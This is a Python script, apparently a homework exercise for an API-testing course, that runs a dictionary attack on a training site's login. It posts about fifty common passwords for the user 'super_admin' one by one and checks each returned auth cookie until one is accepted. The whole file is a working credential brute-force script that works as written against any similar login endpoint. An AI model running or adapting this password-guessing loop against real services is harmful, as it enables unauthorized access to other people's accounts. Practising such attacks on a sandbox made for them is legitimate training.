import requests

login = "super_admin"

passwords = [
    "password",
    "123456",
    "12345678",
    "12345",
    "qwerty",
    "123456789",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "111111",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "superman",
    "qazwsx",
    "michael",
    "Football",
    "adobe123",
    "photoshop",
    "1qaz2wsx",
    "mustang",
    "access",
    "696969",
    "welcome",
    "login",
    "princess",
    "qwertyuiop",
    "1q2w3e4r",
    "solo",
    "starwars",
    "loveme",
    "zaq1zaq1",
    "hello",
    "freedom",
    "!@#$%^&*",
    "charlie",
    "aa123456",
    "donald",
    "batman",
    "000000",
    "qwerty123",
    "123qwe"
]

url_get_password = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords:
    response1 = requests.post(
        "https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
        data={"login": login, "password": password}
    )

    auth_cookie = response1.cookies.get("auth_cookie")

    response2 = requests.get(
        "https://playground.learnqa.ru/ajax/api/check_auth_cookie",
        cookies={"auth_cookie": auth_cookie}
    )

    if response2.text != "You are NOT authorized":
        print("Найден верный пароль:", password)
        print("Ответ сервера:", response2.text)
        break
